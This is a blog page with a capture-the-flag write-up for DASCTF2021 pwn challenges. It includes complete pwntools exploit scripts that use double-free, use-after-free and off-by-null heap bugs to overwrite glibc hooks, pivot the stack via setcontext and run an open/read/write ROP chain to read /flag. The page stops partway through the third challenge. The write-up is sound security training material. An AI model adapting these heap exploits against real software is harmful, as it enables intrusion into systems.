<!DOCTYPE html>












  


<html class="theme-next muse use-motion" lang>
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
























<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">

<link rel="stylesheet" href="/css/main.css?v=7.1.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.1.0">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.1.0">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.1.0">


  <link rel="mask-icon" href="/images/logo.svg?v=7.1.0" color="#222">







<script id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '7.1.0',
    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
    back2top: true,
    back2top_sidebar: false,
    fancybox: false,
    fastclick: false,
    lazyload: false,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>


  




  <meta property="og:type" content="website">
<meta property="og:title" content="xkaneiki&#39;s blog">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="xkaneiki&#39;s blog">
<meta property="og:locale" content="default">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="xkaneiki&#39;s blog">





  
  
  <link rel="canonical" href="http://yoursite.com/">



<script id="page.configurations">
  CONFIG.page = {
    sidebar: "",
  };
</script>

  <title>xkaneiki's blog</title>
  












  <noscript>
  <style>
  .use-motion .motion-element,
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-title { opacity: initial; }

  .use-motion .logo,
  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="default">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">xkaneiki's blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
    
    
  </div>

  <div class="site-nav-toggle">
    <button aria-label="Toggle navigation bar">
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>



<nav class="site-nav">
  
    <ul id="menu" class="menu">
      
        
        
        
          
          <li class="menu-item menu-item-home menu-item-active">

    
    
    
      
    

    

    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-tags">

    
    
    
      
    

    

    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-categories">

    
    
    
      
    

    

    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>Categories</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-archives">

    
    
    
      
    

    

    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>

  </li>

      
      
    </ul>
  

  
    

  

  
</nav>



  



</div>
    </header>

    
  
  

  

  <a href="https://github.com/xkaneiki" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewbox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a>



    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/04/07/dasctf2021/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="xkaneiki">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="xkaneiki's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2021/04/07/dasctf2021/" class="post-title-link" itemprop="url">dasctf2021</a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2021-04-07 10:21:36 / Modified: 13:15:50" itemprop="dateCreated datePublished" datetime="2021-04-07T10:21:36+08:00">2021-04-07</time>
            

            
              

              
            
          </span>

          

          
            
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="DASCTF2021"><a href="#DASCTF2021" class="headerlink" title="DASCTF2021"></a>DASCTF2021</h1><h2 id="fruitpie"><a href="#fruitpie" class="headerlink" title="fruitpie"></a>fruitpie</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>这题可以malloc一个指定size的chunk，并且返回chunk的地址，然后可以指定一个偏移，向偏移中写入0x10个字节的数据。这题申请很大的空间以后heap的地址和libc的基地址是相对固定的。</p>
<ol>
<li>申请一个很大的空间，要尽可能的大</li>
<li>拿到heap地址根据相对偏移算出libc地址</li>
<li>设定指定的偏移值，向<code>__malloc_hook</code>中写入gadget</li>
</ol>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    p = process(<span class="string">"./fruitpie"</span>)</span><br><span class="line">    lb = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc-2.27.so"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">"54f57bff-61b7-47cf-a0ff-f23c4dc7756a.machine.dasctf.com"</span>, <span class="string">"50302"</span>)</span><br><span class="line">    lb = ELF(<span class="string">"libc.so.6"</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Enter the size to malloc:"</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x5000000</span>))</span><br><span class="line">p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">hp = int(p.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">libc = hp+<span class="number">0x5000ff0</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">'libc'</span>, hex(libc))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.recvuntil(<span class="string">"Offset:"</span>)</span><br><span class="line">mh = lb.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">off = (mh+<span class="number">0x5000ff0</span>)</span><br><span class="line">print(hex(off))</span><br><span class="line">p.sendline(hex(off))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">print(<span class="string">"mh"</span>, hex(mh+libc))</span><br><span class="line">p.recvuntil(<span class="string">"Data:"</span>)</span><br><span class="line">p.send(p64(libc+<span class="number">0x10a45c</span>)*<span class="number">2</span>)</span><br><span class="line">p.sendline(<span class="string">"cat /flag &gt;&amp;2"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="ParentSimulator"><a href="#ParentSimulator" class="headerlink" title="ParentSimulator"></a>ParentSimulator</h2><h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p>这是典型的表单题，程序中申请的结构大概如下所示，其大小是0x100。用seccomp-tools检查程序发现程序禁用了execve的syscall，所以考虑利用orw获得提权。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">baby</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> name[<span class="number">8</span>];</span><br><span class="line">  <span class="keyword">char</span> gender[<span class="number">8</span>];</span><br><span class="line">  <span class="keyword">char</span> des[<span class="number">0xf0</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>程序中有几个重要的函数分别是birth、change_name、change_des、remove和show</p>
<p>birth有如下功能：</p>
<ol>
<li>malloc申请0x100的空间来存储一个baby</li>
<li>输入name和设置gender</li>
<li>对应标志位置1（use）</li>
</ol>
<p>change_name用来修改结构中的name（检查标志位是否为1）</p>
<p>change_des用来修改结构中的des（检查标志位是否为1）</p>
<p>remove释放指定的baby，并且对用标志位置0，<strong>地址不清空（释放时不检查标志位，而是检查地址不为空）</strong></p>
<p>show将所有的baby的name、gender和des打印出来</p>
<h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><h4 id="获得libc地址"><a href="#获得libc地址" class="headerlink" title="获得libc地址"></a>获得libc地址</h4><p>这里remove不清空地址，而且释放时不检查标志位，只检查地址不为空，因此可以重复释放地址（明显的double free）。由于2.31中libc地址会检查tcache的double free的，但是可以利用unsortbin来进行double free。具体步骤如下：</p>
<ol>
<li>首先释放堆块填满 tcache（包含需要double free的堆块chunk0）</li>
<li>将需要double free的堆块和<strong>在其之前的，相连的</strong>堆块chunk1一起释放，两个块合并一起进入unsortbin</li>
<li>将tcache中的堆块申请完（chunk0已经被申请）</li>
<li>申请chunk1，切割unsortbin使得libc的地址进入chunk0中</li>
<li>利用程序的show，获得libc的地址</li>
</ol>
<h4 id="栈迁移，执行orw"><a href="#栈迁移，执行orw" class="headerlink" title="栈迁移，执行orw"></a>栈迁移，执行orw</h4><ol>
<li>继续申请堆块姜chunk0申请出来，现在我们有两个地方存在chunk0，利用uaf，我们先释放掉一个堆块进入tcache中然后再释放一个chunk0，这样chunk0中就有一个堆地址，这时再输出chunk0我们就能拿到heap的地址。</li>
<li>利用uaf，利用change_name修改chunk0的fd指针，是指针指向和chunk0的des重合的堆块（为之后栈迁移做准备)，从而申请重叠堆块。</li>
<li>再将chunk0释放如tache进行uaf。利用change_name修改chunk0的下个堆块到<code>__free_hook</code>，然后再连续申请两个就能够拿到<code>__free_hook</code>的控制权。</li>
<li>程序开了沙箱将execve的syscall给禁用了，只能考虑orw。orw依赖栈才能够有效，所以首先要进行栈迁移。推荐一个gadget，此gadget通过rdi控制rdx。利用<code>__free_hook</code>执行gadget，然后再配和setcontext+61通过rdx控制rsp来进行栈迁移。 </li>
</ol>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x00000000001547a0: mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];</span><br></pre></td></tr></table></figure>
<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line">c</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">  puts("1.Give birth to a child");</span></span><br><span class="line"><span class="string">  puts("2.Change child's name");</span></span><br><span class="line"><span class="string">  puts("3.Show children's name");</span></span><br><span class="line"><span class="string">  puts("4.Remove your child");</span></span><br><span class="line"><span class="string">  puts("5.Edit child's description.");</span></span><br><span class="line"><span class="string">  puts("6.Exit");</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    p = process(<span class="string">"./pwn"</span>)</span><br><span class="line">    lb = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc-2.31.so"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(D)</span><br><span class="line">    lb = ELF(<span class="string">"./libc-2.31.so"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx, gen, name)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Please input index?"</span>, str(idx))</span><br><span class="line">    p.sendlineafter(</span><br><span class="line">        <span class="string">"Please choose your child's gender.\n1.Boy\n2.Girl:"</span>, str(gen))</span><br><span class="line">    p.sendlineafter(<span class="string">"Please input your child's name:"</span>, name)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_name</span><span class="params">(idx, name)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Please input index?"</span>, str(idx))</span><br><span class="line">    p.sendafter(<span class="string">"Please input your child's new name:"</span>, name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Please input index?"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dlt</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">'4'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Please input index?"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_des</span><span class="params">(idx, des)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">'5'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Please input index?"</span>, str(idx))</span><br><span class="line">    p.sendafter(<span class="string">"Please input your child's description:"</span>, des)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_gen</span><span class="params">(idx, gen)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">'666'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Please input index?"</span>, str(idx))</span><br><span class="line">    p.sendafter(<span class="string">"Please rechoose your child's gender.\n1.Boy\n2.Girl:"</span>, str(gen))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    add(i, <span class="number">1</span>, <span class="string">'aaaa'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    dlt(<span class="number">6</span>-i)</span><br><span class="line"></span><br><span class="line">dlt(<span class="number">7</span>)</span><br><span class="line">dlt(<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">1</span>, <span class="string">'aaaa'</span>)</span><br><span class="line">dlt(<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">1</span>, <span class="string">'aaaa'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    add(<span class="number">2</span>+i, <span class="number">1</span>, <span class="string">'aaaa'</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">add(<span class="number">1</span>, <span class="number">1</span>, <span class="string">'aaaa'</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Name: '</span>)</span><br><span class="line">libc = u64(p.recvuntil(<span class="string">','</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))<span class="number">-0x1ebbe0</span></span><br><span class="line">print(<span class="string">'libc'</span>, hex(libc))</span><br><span class="line">add(<span class="number">1</span>, <span class="number">1</span>, <span class="string">'aaaa'</span>)</span><br><span class="line"></span><br><span class="line">dlt(<span class="number">2</span>)</span><br><span class="line">dlt(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Name: '</span>)</span><br><span class="line">heap = u64(p.recvuntil(<span class="string">','</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">print(<span class="string">'heap'</span>, hex(heap))</span><br><span class="line"></span><br><span class="line">fh = libc+lb.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line">context = libc+lb.sym[<span class="string">'setcontext'</span>]</span><br><span class="line">change_name(<span class="number">0</span>, p64(fh)[:<span class="number">7</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>, <span class="number">1</span>, <span class="string">'\x33\x33\33\x33'</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">1</span>, <span class="string">'\x00\x00'</span>)</span><br><span class="line"></span><br><span class="line">dlt(<span class="number">4</span>)</span><br><span class="line">dlt(<span class="number">1</span>)</span><br><span class="line">heap = heap+<span class="number">0x760</span>+<span class="number">0x20</span></span><br><span class="line">change_name(<span class="number">0</span>, p64(heap))</span><br><span class="line">add(<span class="number">1</span>, <span class="number">1</span>, <span class="string">'\x33\x33\33\x33'</span>)</span><br><span class="line">add(<span class="number">4</span>, <span class="number">1</span>, <span class="string">'aaaaa'</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    gadget = libc+<span class="number">0x154930</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    gadget = libc+<span class="number">0x1547a0</span></span><br><span class="line">print(<span class="string">"gadget"</span>, hex(gadget))</span><br><span class="line">change_name(<span class="number">2</span>, p64(gadget)[:<span class="number">7</span>])</span><br><span class="line">print(hex(heap))</span><br><span class="line">gdb.attach(p)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    rdi = libc+<span class="number">0x26b72</span></span><br><span class="line">    rsi = libc+<span class="number">0x27529</span></span><br><span class="line">    rdx = libc+<span class="number">0x11c371</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    rdi = libc+<span class="number">0x026b72</span></span><br><span class="line">    rsi = libc+<span class="number">0x027529</span></span><br><span class="line">    rdx = libc+<span class="number">0x11c1e1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">o = libc+lb.sym[<span class="string">'open'</span>]</span><br><span class="line">w = libc+lb.sym[<span class="string">'write'</span>]</span><br><span class="line">r = libc + lb.sym[<span class="string">'read'</span>]</span><br><span class="line"></span><br><span class="line">des = p64(heap)*<span class="number">4</span>+p64(context+<span class="number">61</span>)+<span class="string">b'/flag\0\0'</span></span><br><span class="line">des += (<span class="number">0xa0</span>-len(des))*<span class="string">b'\x00'</span>+p64(heap<span class="number">-0x450</span>+<span class="number">0x10</span>)+p64(rdi)</span><br><span class="line">print(len(des))</span><br><span class="line">pause()</span><br><span class="line">change_des(<span class="number">1</span>, des)</span><br><span class="line">des = p64(heap+<span class="number">0x28</span>)+p64(rsi)+p64(<span class="number">0</span>)+p64(o)</span><br><span class="line">des += p64(rdi)+p64(<span class="number">4</span>)+p64(rsi)+p64(heap)+p64(rdx)+p64(<span class="number">0x30</span>)*<span class="number">2</span>+p64(r)</span><br><span class="line">des += p64(rdi)+p64(<span class="number">1</span>)+p64(rsi)+p64(heap)+p64(rdx)+p64(<span class="number">0x30</span>)*<span class="number">2</span>+p64(w)</span><br><span class="line">change_des(<span class="number">5</span>, des)</span><br><span class="line">dlt(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="babybabybabyheap"><a href="#babybabybabyheap" class="headerlink" title="babybabybabyheap"></a>babybabybabyheap</h2><p>程序首先会给一个puts的地址<code>printf(&quot;gift: %p\n&quot;, &amp;puts);</code>，就将libc的地址给泄漏出来了。检查程序开启的保护，发现程序没有开启pie保护，这意味着我们知道程序的地址。</p>
<p>程序主要有三个函数alloc、dlt和vul函数</p>
<p>alloc函数会用malloc申请0x80～0x200的空间并且往里面写入内容（但是没有溢出），并且记录下size大小</p>
<p>dlt会首先检查将要释放的空间的size是否为空，然后释放对应的空间，并且清空对应的size（没有double free）</p>
<p>vul函数<strong>只能执行一次</strong>，修改指定的堆块的内容，<strong>会溢出一个NULL</strong>。</p>
<h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>程序是有一个offset by none 的漏洞，考虑用unlink进行堆块的合并，然后获得重叠的堆块进行攻击。程序的环境是glibc2.31，由于glibc2.31中会加入一个如下的检查</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">        malloc_printerr (<span class="string">"corrupted size vs. prev_size while consolidating"</span>);</span><br></pre></td></tr></table></figure>
<p>原先的unlink consolidate就不再有效，因此需要额外的想法</p>
<p>首先这题没有开pie，也就是说我们是可以知道bss段的地址的</p>
<ol>
<li><p>构造fake_chunk将大小设置好</p>
</li>
<li><p>通过程序的分配功能将fake_chunk分配到程序中，将地址写在bss段上再释放，由于程序释放时不会清空地址，所以fakechunk的地址会一直保存在bss段，令这个地址为addr（这个地址我们时知道的）。</p>
</li>
<li><p>将fake_chunk的fd设置为addr-0x18，将fake_chunk的bk设置成addr-0x10，用于绕过检查</p>
</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mchunkptr fd = p-&gt;fd;</span><br><span class="line">mchunkptr bk = p-&gt;bk;</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">"corrupted double-linked list"</span>);</span><br></pre></td></tr></table></figure>
